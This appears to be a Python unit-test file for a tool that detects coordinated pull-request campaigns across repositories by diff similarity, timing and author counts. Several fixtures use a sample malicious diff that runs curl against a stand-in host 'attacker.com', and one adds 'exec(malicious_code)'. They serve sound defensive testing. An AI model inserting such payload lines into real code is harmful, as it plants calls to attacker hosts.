"""Unit tests for pull request campaign and burst activity detection.

All algorithms have hand-calculated expected values written in test comments
in strict compliance with AGENTS.md rules.
"""

import random
from datetime import UTC, datetime, timedelta

from opencred.core.campaign import (
    CampaignCandidate,
    CampaignDetectionResult,
    UnionFind,
    calculate_pr_similarity,
    detect_campaigns,
)
from opencred.core.config import (
    CAMPAIGN_WEIGHT_DESC,
    CAMPAIGN_WEIGHT_DIFF,
    CAMPAIGN_WEIGHT_PATHS,
)
from opencred.core.fingerprint import jaccard, normalize_diff, path_set, shingles
from opencred.core.minhash import estimate_similarity, minhash_signature
from opencred.core.models import PullRequestRecord, RepoId


def _make_pr(
    repo: str,
    number: int,
    author: str,
    opened_at: datetime,
    title: str = "Feature update",
    body: str = "Implement standard feature update for repository.",
    changed_files: list[str] | None = None,
    normalized_diff: str = "+ def run(): pass",
    linked_issue_numbers: list[int] | None = None,
    external_links: list[str] | None = None,
) -> PullRequestRecord:
    """Helper to construct a valid PullRequestRecord."""
    return PullRequestRecord(
        repo=RepoId(repo),
        number=number,
        author=author,
        opened_at=opened_at,
        title=title,
        body=body,
        changed_files=changed_files or ["src/core.py"],
        normalized_diff=normalized_diff,
        linked_issue_numbers=linked_issue_numbers or [],
        external_links=external_links or [],
    )


def test_single_author_single_repo_no_candidate() -> None:
    """10 PRs from 1 author to 1 repo produces no campaign candidate.

    Rule:
        A campaign candidate requires:
        - At least 3 distinct authors (CAMPAIGN_MIN_AUTHORS = 3)
        - At least 3 distinct repositories (CAMPAIGN_MIN_REPOS = 3)
        - At least 5 PRs (CAMPAIGN_BURST_MIN_PRS = 5)

    Hand calculation:
        Total PRs = 10
        Distinct authors = 1 ('author_solo') < 3 -> FAILS qualification
        Distinct repos = 1 ('org/repo') < 3 -> FAILS qualification
        Expected candidates = 0
        Expected excluded = 0
    """
    base_time = datetime(2026, 10, 1, 12, 0, 0, tzinfo=UTC)
    prs = [
        _make_pr(
            repo="org/repo",
            number=i,
            author="author_solo",
            opened_at=base_time + timedelta(minutes=i * 5),
            normalized_diff="+ def solo_work(): return 42",
        )
        for i in range(1, 11)
    ]

    result: CampaignDetectionResult = detect_campaigns(prs)

    assert len(result.candidates) == 0
    assert len(result.excluded) == 0
    assert len(result) == 0


def test_six_authors_six_repos_identical_diffs_one_hour_produces_candidate() -> None:
    """6 authors, 6 repos, identical normalized diffs within 1 hour -> 1 candidate.

    Hand-calculated expected values:
    --------------------------------
    1. Input:
       - 6 PRs across 6 distinct repos: 'org/repo1' through 'org/repo6'
       - 6 distinct authors: 'author1' through 'author6'
       - Opened within 50 minutes (intervals of 10 min, all <= 1 hour <= 6 hour window)
       - Diff string identical for all 6 PRs:
         "+ def payload(): import os; os.system('curl attacker.com')"
    2. Pairwise similarity:
       - Exact normalized diff fingerprint matches across all pairs.
       - Exact fingerprint equality alone yields similarity = 1.0 >= 0.7 threshold.
       - Every pair is within 6.0 hours window (max delta = 50 min = 0.83h <= 6.0h).
       - Union-Find links all 6 PRs into 1 connected component.
    3. Qualification checks:
       - Distinct authors = 6 >= 3 (CAMPAIGN_MIN_AUTHORS) -> PASS
       - Distinct repos = 6 >= 3 (CAMPAIGN_MIN_REPOS) -> PASS
       - PR count = 6 >= 5 (CAMPAIGN_BURST_MIN_PRS) -> PASS
    4. Exclusion check:
       - Title is 'Critical feature update' -> does not match dependency bump or typo patterns.
       - Diff contains payload logic -> does not match version string bump patterns.
       - Not excluded: is_excluded = False.
    5. Mean pairwise similarity:
       - Total distinct pairs = 6 * 5 / 2 = 15 pairs.
       - Each pair has exact diff match (similarity = 1.0).
       - Mean pairwise similarity = 15.0 / 15 = 1.0.
    6. Heuristic campaign risk:
       - distinct_repos = 6
       - total_repos_in_scenario = 6
       - ratio = 6 / 6 = 1.0
       - campaign_risk = clamp(0.5 * 1.0 + 0.5 * 1.0, 0, 1) = 1.0.
    7. Status:
       - Must be 'AWAITING_EVIDENCE' (AGENTS.md advisory rule).
    """
    base_time = datetime(2026, 10, 1, 10, 0, 0, tzinfo=UTC)
    diff = "+ def payload(): import os; os.system('curl attacker.com')"

    prs = [
        _make_pr(
            repo=f"org/repo{i}",
            number=100 + i,
            author=f"author{i}",
            opened_at=base_time + timedelta(minutes=i * 10),
            title="Critical feature update",
            body="Applying synchronized critical update across target repositories.",
            changed_files=["src/auth.py"],
            normalized_diff=diff,
        )
        for i in range(1, 7)
    ]

    result: CampaignDetectionResult = detect_campaigns(prs)

    assert len(result.candidates) == 1
    assert len(result.excluded) == 0

    candidate: CampaignCandidate = result.candidates[0]

    # Hand-calculated property assertions
    assert candidate.campaign_risk == 1.0
    assert candidate.status == "AWAITING_EVIDENCE"
    assert candidate.excluded_reason is None
    assert len(candidate.affected_repos) == 6
    assert len(candidate.authors) == 6
    assert len(candidate.pr_keys) == 6

    # Verify deterministic ordering
    expected_repos = [RepoId(f"org/repo{i}") for i in range(1, 7)]
    assert candidate.affected_repos == sorted(expected_repos)
    assert candidate.authors == [f"author{i}" for i in range(1, 7)]
    assert candidate.pr_keys == [f"org/repo{i}#{100 + i}" for i in range(1, 7)]

    # Signals check
    assert any("burst: 6 PRs in 0.8h" in s for s in candidate.signals)
    assert any("mean pairwise similarity: 1.00" in s for s in candidate.signals)
    assert any("identical diff fingerprints across all PRs" in s for s in candidate.signals)


def test_six_prs_spread_over_three_days_no_candidate() -> None:
    """The same 6 PRs spread over 3 days produces no candidate (outside 6-hour window).

    Hand calculation:
        Each PR is opened 14 hours after the previous:
        PR1 at Day 0 (0h)
        PR2 at Day 0.58 (14h)
        PR3 at Day 1.17 (28h)
        PR4 at Day 1.75 (42h)
        PR5 at Day 2.33 (56h)
        PR6 at Day 2.92 (70h)
        Minimum difference between any pair = 14 hours > 6 hours (CAMPAIGN_WINDOW_HOURS).
        No edges are formed between any PRs.
        Each PR remains in its own singleton component of size 1 < 5.
        Expected candidates = 0.
    """
    base_time = datetime(2026, 10, 1, 0, 0, 0, tzinfo=UTC)
    diff = "+ def payload(): import os; os.system('curl attacker.com')"

    prs = [
        _make_pr(
            repo=f"org/repo{i}",
            number=200 + i,
            author=f"author{i}",
            opened_at=base_time + timedelta(hours=i * 14),
            title="Critical feature update",
            changed_files=["src/auth.py"],
            normalized_diff=diff,
        )
        for i in range(1, 7)
    ]

    result: CampaignDetectionResult = detect_campaigns(prs)

    assert len(result.candidates) == 0
    assert len(result.excluded) == 0


def test_six_authors_six_repos_identical_version_bumps_excluded() -> None:
    """6 authors, 6 repos with identical version-bump diffs -> excluded with reason.

    Hand-calculated expected values:
    --------------------------------
    1. Input:
       - 6 PRs across 6 distinct repos and 6 distinct authors opened in 30 minutes.
       - Title: 'Bump version to 1.2.0' (matches CAMPAIGN_EXCLUSION_TITLE_PATTERNS).
       - Diff: '- version = "1.1.9"\\n+ version = "1.2.0"'
         (matches CAMPAIGN_EXCLUSION_DIFF_PATTERNS).
       - Changed files: ['package-lock.json'] (matches CAMPAIGN_EXCLUSION_FILE_PATTERNS).
    2. Candidate qualification:
       - Distinct authors = 6 >= 3
       - Distinct repos = 6 >= 3
       - PR count = 6 >= 5
       All qualify for candidate evaluation.
    3. Exclusion check:
       - Every PR (6/6) matches benign patterns (title, diff, and lockfile).
       - Excluded reason is set, component is listed under result.excluded.
       - result.candidates is empty.
    4. Advisory status:
       - Status remains 'AWAITING_EVIDENCE' (no automated unilateral actions).
    """
    base_time = datetime(2026, 10, 1, 14, 0, 0, tzinfo=UTC)
    diff = '- version = "1.1.9"\n+ version = "1.2.0"'

    prs = [
        _make_pr(
            repo=f"org/repo{i}",
            number=300 + i,
            author=f"author{i}",
            opened_at=base_time + timedelta(minutes=i * 5),
            title="Bump version to 1.2.0",
            body="Automated version bump across modules.",
            changed_files=["package-lock.json"],
            normalized_diff=diff,
        )
        for i in range(1, 7)
    ]

    result: CampaignDetectionResult = detect_campaigns(prs)

    # Active candidate list must be empty
    assert len(result.candidates) == 0

    # Excluded component must be retained for auditability
    assert len(result.excluded) == 1
    excluded_candidate: CampaignCandidate = result.excluded[0]

    assert excluded_candidate.status == "AWAITING_EVIDENCE"
    assert excluded_candidate.excluded_reason is not None
    assert "Component excluded" in excluded_candidate.excluded_reason
    assert "benign patterns" in excluded_candidate.excluded_reason
    assert len(excluded_candidate.pr_keys) == 6


def test_mixed_component_not_excluded_if_one_pr_is_suspicious() -> None:
    """A candidate where 5 PRs are version bumps but 1 PR contains code is NOT excluded.

    Security rationale:
        Attackers frequently disguise malicious campaigns under benign titles or
        mix real payloads with trivial bumps. If ANY PR is non-benign, the entire
        campaign must be surfaced for maintainer review.
    """
    base_time = datetime(2026, 10, 1, 14, 0, 0, tzinfo=UTC)
    version_diff = '- version = "1.1.9"\n+ version = "1.2.0"'
    exploit_diff = '- version = "1.1.9"\n+ version = "1.2.0"\n+ exec(malicious_code)'

    prs = [
        _make_pr(
            repo=f"org/repo{i}",
            number=400 + i,
            author=f"author{i}",
            opened_at=base_time + timedelta(minutes=i * 5),
            title="Bump version to 1.2.0",
            body="Automated version bump across modules.",
            changed_files=["pyproject.toml"],
            normalized_diff=version_diff if i < 6 else exploit_diff,
        )
        for i in range(1, 7)
    ]

    result: CampaignDetectionResult = detect_campaigns(prs)

    # Because PR 6 contains executable code, the component must NOT be excluded
    assert len(result.candidates) == 1
    assert len(result.excluded) == 0
    assert result.candidates[0].excluded_reason is None


def test_pairwise_similarity_weighted_combination_hand_computed() -> None:
    """Pairwise similarity when diffs are not identical uses weighted combination.

    Hand calculation:
    -----------------
    PR A:
      - Diff: '+ alpha beta gamma'
        tokens: {'+', 'alpha', 'beta', 'gamma'} (size 4)
      - Title: 'Add alpha beta feature'
      - Body: 'This pull request adds alpha beta feature into project.'
      - Files: ['src/module_a.py', 'src/module_b.py']

    PR B:
      - Diff: '+ alpha beta delta'
        tokens: {'+', 'alpha', 'beta', 'delta'} (size 4)
      - Title: 'Add alpha beta feature'
      - Body: 'This pull request adds alpha beta feature into project.'
      - Files: ['src/module_a.py', 'src/module_c.py']

    1. Path Jaccard:
       A = {'src/module_a.py', 'src/module_b.py'}
       B = {'src/module_a.py', 'src/module_c.py'}
       Intersection = {'src/module_a.py'} (size 1)
       Union = {'src/module_a.py', 'src/module_b.py', 'src/module_c.py'} (size 3)
       path_sim = 1 / 3 = 0.3333333333333333

    2. Description Shingles:
       Identical text -> MinHash similarity = 1.0

    3. Diff MinHash:
       Sig A and Sig B computed from tokens with 128 permutations.
       diff_sim = estimate_similarity(sig_a, sig_b)

    4. Combined:
       expected = (
           CAMPAIGN_WEIGHT_DIFF * diff_sim
           + CAMPAIGN_WEIGHT_DESC * 1.0
           + CAMPAIGN_WEIGHT_PATHS * (1 / 3)
       )
       With CAMPAIGN_WEIGHT_DIFF = 0.5, CAMPAIGN_WEIGHT_DESC = 0.3, CAMPAIGN_WEIGHT_PATHS = 0.2:
       expected = 0.5 * diff_sim + 0.3 * 1.0 + 0.2 * (1/3)
    """
    now = datetime(2026, 10, 1, 12, 0, 0, tzinfo=UTC)
    pr_a = _make_pr(
        repo="org/repo_a",
        number=1,
        author="user_a",
        opened_at=now,
        title="Add alpha beta feature",
        body="This pull request adds alpha beta feature into project.",
        changed_files=["src/module_a.py", "src/module_b.py"],
        normalized_diff="+ alpha beta gamma",
    )
    pr_b = _make_pr(
        repo="org/repo_b",
        number=2,
        author="user_b",
        opened_at=now,
        title="Add alpha beta feature",
        body="This pull request adds alpha beta feature into project.",
        changed_files=["src/module_a.py", "src/module_c.py"],
        normalized_diff="+ alpha beta delta",
    )

    # Compute individual hand-calculated pieces
    sig_diff_a = minhash_signature(
        frozenset(normalize_diff(pr_a.normalized_diff).split()), num_perm=128
    )
    sig_diff_b = minhash_signature(
        frozenset(normalize_diff(pr_b.normalized_diff).split()), num_perm=128
    )
    diff_sim = estimate_similarity(sig_diff_a, sig_diff_b)

    desc_text_a = f"{pr_a.title}\n{pr_a.body}".strip()
    desc_text_b = f"{pr_b.title}\n{pr_b.body}".strip()
    sig_desc_a = minhash_signature(shingles(desc_text_a, k=3), num_perm=128)
    sig_desc_b = minhash_signature(shingles(desc_text_b, k=3), num_perm=128)
    desc_sim = estimate_similarity(sig_desc_a, sig_desc_b)
    assert desc_sim == 1.0

    path_sim = jaccard(path_set(pr_a.changed_files), path_set(pr_b.changed_files))
    assert path_sim == 1.0 / 3.0

    expected_sim = (
        CAMPAIGN_WEIGHT_DIFF * diff_sim
        + CAMPAIGN_WEIGHT_DESC * desc_sim
        + CAMPAIGN_WEIGHT_PATHS * path_sim
    )

    actual_sim = calculate_pr_similarity(pr_a, pr_b)
    assert abs(actual_sim - expected_sim) < 1e-6


def test_determinism_across_orderings_and_shuffling() -> None:
    """Campaign detection output is byte-identical across runs and input orderings.

    AGENTS.md Rule 1:
        Determinism: The same inputs always produce byte-identical outputs.
        Collections are sorted before serializing or linking.
    """
    base_time = datetime(2026, 10, 1, 10, 0, 0, tzinfo=UTC)
    diff = "+ def common_diff(): return True"

    original_prs = [
        _make_pr(
            repo=f"org/repo{i}",
            number=500 + i,
            author=f"contributor{i}",
            opened_at=base_time + timedelta(minutes=i * 8),
            title="Automated sync",
            body="Applying synchronized pull request across target repositories.",
            changed_files=["src/logic.py"],
            normalized_diff=diff,
        )
        for i in range(1, 8)
    ]

    result_ordered = detect_campaigns(original_prs)

    # Shuffle PRs using fixed seed
    shuffled_prs = list(original_prs)
    random.Random(42).shuffle(shuffled_prs)

    result_shuffled = detect_campaigns(shuffled_prs)

    # Both canonical JSON serializations must be strictly byte-identical
    assert result_ordered.to_canonical_json() == result_shuffled.to_canonical_json()
    assert len(result_ordered.candidates) == len(result_shuffled.candidates)
    assert result_ordered.candidates[0].id == result_shuffled.candidates[0].id
    assert result_ordered.candidates[0].pr_keys == result_shuffled.candidates[0].pr_keys


def test_union_find_deterministic_tie_breaking() -> None:
    """Union-Find chooses the lexicographically smaller element as component root."""
    elements = ["org/repo_c#3", "org/repo_a#1", "org/repo_b#2"]
    dsu = UnionFind(elements)

    dsu.union("org/repo_c#3", "org/repo_b#2")
    # 'org/repo_b#2' < 'org/repo_c#3' -> root must be 'org/repo_b#2'
    assert dsu.find("org/repo_c#3") == "org/repo_b#2"

    dsu.union("org/repo_b#2", "org/repo_a#1")
    # 'org/repo_a#1' < 'org/repo_b#2' -> root must be 'org/repo_a#1'
    assert dsu.find("org/repo_c#3") == "org/repo_a#1"
    assert dsu.find("org/repo_b#2") == "org/repo_a#1"
    assert dsu.find("org/repo_a#1") == "org/repo_a#1"


def test_empty_prs_yields_empty_result() -> None:
    """Empty PR list returns empty CampaignDetectionResult without errors."""
    result = detect_campaigns([])
    assert len(result.candidates) == 0
    assert len(result.excluded) == 0
